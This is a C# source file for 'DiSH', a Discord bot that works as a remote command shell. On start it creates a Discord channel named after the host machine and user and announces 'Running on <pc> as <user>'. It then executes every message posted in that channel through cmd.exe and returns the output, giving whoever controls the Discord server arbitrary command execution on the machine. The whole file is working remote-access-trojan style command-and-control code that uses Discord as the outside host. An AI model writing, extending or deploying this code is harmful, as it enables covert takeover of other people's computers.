using Discord;
using Discord.WebSocket;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace DiSHCore
{
    public class DiSH
    {

        public string Token;
        public ulong GuildID;
        public ulong CategoryID;
        public ulong LogsID;
        public Func<string, string> LogFunc;
        public Dictionary<string, Func<string, string>> Overrides = new Dictionary<string, Func<string, string>>();
        private DiscordSocketClient? client;
        private SocketTextChannel? Channel = null;
        private SocketGuild? Guild = null;
        private SocketCategoryChannel? Category = null;
        private SocketTextChannel? Logs = null;

        private string cdFunction(string args)
        {
            Directory.SetCurrentDirectory(args);
            return "";
        }
        public DiSH(string token, ulong guildID, ulong categoryID, ulong logsID, Func<string, string> logFunc)
        {
            Token = token;
            GuildID = guildID;
            CategoryID = categoryID;
            LogsID = logsID;
            LogFunc = logFunc;
            Overrides.Add("cd", cdFunction);
        }

        private Task logMessage(LogMessage message)
        {
            var v = LogFunc(message.ToString());
            return Task.CompletedTask;
        }

        private async Task runCommand(SocketMessage message, DiscordSocketClient client)
        {
            string content = message.Content;
            string[] split = content.Split(' ');
            string executable = split[0];
            string args = string.Join(" ", split.Skip(1));
            Console.WriteLine(content);
            Console.WriteLine(split);
            Console.WriteLine(executable);
            Console.WriteLine(args);
            if (Overrides.Keys.Contains(executable))
            {
                Overrides[executable](args);
            }
            Process p = new Process();
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + message.Content;
            p.Start();
            p.WaitForExit();
            string output = p.StandardOutput.ReadToEnd();
            await message.Channel.SendMessageAsync(output);
        }
        private async Task MessageReceived(SocketMessage message)
        {
            if (message.Author.Id == client?.CurrentUser.Id) { return; }
            if (message.Channel.Id == Channel.Id)
            {
                new Thread(() => runCommand(message, client)).Start();
            }
            LogFunc("["+ message.Author.Username+"] "+message.Content);
        }

        public async Task RunBot()
        {
            var config = new DiscordSocketConfig
            {
                AlwaysDownloadUsers = true,
                MessageCacheSize = 500,
                GatewayIntents = GatewayIntents.All
            };
            client = new DiscordSocketClient(config);
            client.Log += logMessage;
            await client.LoginAsync(TokenType.Bot, Token);
            await client.StartAsync();
            client.MessageReceived += MessageReceived;
            client.Ready += async () =>
            {
                LogFunc("Bot is connected!");

                string userName = Environment.UserName;
                string pcName = Environment.MachineName;
                string channelName = pcName.ToLower() + "-" + userName.ToLower();

                this.Guild = client.GetGuild(this.GuildID);
                this.Category = Guild.GetCategoryChannel(this.CategoryID);

                var channel = this.Guild.Channels.SingleOrDefault(x => x.Name == channelName);
                this.Channel = (SocketTextChannel)channel;

                if (channel == null) // there is no channel with the name of 'log'
                {
                    // create the channel
                    var newChannel = await this.Guild.CreateTextChannelAsync(channelName);
                    await newChannel.ModifyAsync(x => { x.CategoryId = CategoryID; });

                    // If you need the newly created channels id
                    var newChannelId = newChannel.Id;
                    this.Channel = (SocketTextChannel)client.GetChannel(newChannelId);
                }
                this.Channel.ModifyAsync(x => { x.CategoryId = CategoryID; });
                Console.WriteLine(Channel.Id);

                await Channel.SendMessageAsync("Running on " + pcName + " as " + userName);
                return;
            };
            await Task.Delay(-1);
        }

    }
}